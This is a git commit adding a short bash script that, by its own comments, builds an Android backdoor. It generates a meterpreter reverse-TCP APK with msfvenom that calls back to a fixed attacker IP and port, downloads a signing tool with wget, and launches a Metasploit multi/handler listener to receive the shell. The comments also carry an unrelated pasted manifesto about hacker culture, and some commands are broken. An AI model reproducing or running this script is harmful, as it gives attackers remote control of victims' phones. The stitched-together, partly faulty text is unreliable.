2ba86fa78da19e15b4b7c98f221b56dd5d410f8a
Kent - K <xuanhoa.hpu2@gmail.com>
2016-04-19 12:28:00 -0400

    Added files via upload

---
+++ codeapk.sh
@@ -0,0 +1,43 @@
+#!/bin/bash
+#Hello World 
+#Creat Backdoor Code Shell Bash
+#Ifcongfig 
+
+sudo ifconfig
+
+
+#Find 
+
+#Create Folder Backdoor
+#Create
+mkdir /home/hacking/Desktop/madoc
+#MSFvenom
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 R > /home/hacking/Desktop/madoc/madoc.apk
+
+#Create Sign APK Applications
+# SignApk Command
+
+
+sudo wget -c https://github.com/Kent-K/Exploits/blob/master/signapk.tar.gz
+
+
+#Extrart - Menuexe
+#You'll notice the language change since the last edition [1]. Speaking world
+#English already has books, lectures, guides, and information about spare
+#hacking. In this world there are many better I hackers, but unfortunately
+#They squander their knowledge working for contractors "defense"
+# intelligence agencies to protect the banks and corporations and
+
+#to defend the established order. The hacker culture was born in the US as a
+#counterculture, but that source has remained in mere aesthetics - the rest has
+#It has been assimilated. At least they can wear a shirt, dye her hair blue,
+#hackers use their nicknames, and feel rebels while working for the
+#system.
+
+
+sudo mv /home/hacking/signapk.tar.gz /home/hacking/Desktop/madoc
+cd /home/hacking/Desktop/madoc
+tar -xzvf home/hacking/Desktop/madoc/signapk.tar.gz
+msfconsole
+use multi/handler
